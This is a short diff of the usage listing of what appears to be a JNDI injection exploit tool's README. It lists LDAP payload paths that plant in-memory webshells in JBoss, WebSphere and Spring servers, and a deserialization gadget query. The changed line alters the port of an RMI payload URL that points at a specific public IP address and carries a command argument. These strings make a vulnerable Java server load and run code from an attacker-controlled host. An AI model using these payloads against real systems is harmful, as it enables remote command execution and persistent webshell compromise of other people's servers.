@@ -60,7 +60,7 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Basic/JBossMemshell
     ldap://0.0.0.0:1389/Basic/WebsphereMemshell
     ldap://0.0.0.0:1389/Basic/SpringMemshell
-    rmi://42.192.234.204:1389/jilt123 -c [cmd]
+    rmi://42.192.234.204:1099/jilt123 -c [cmd]
 
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
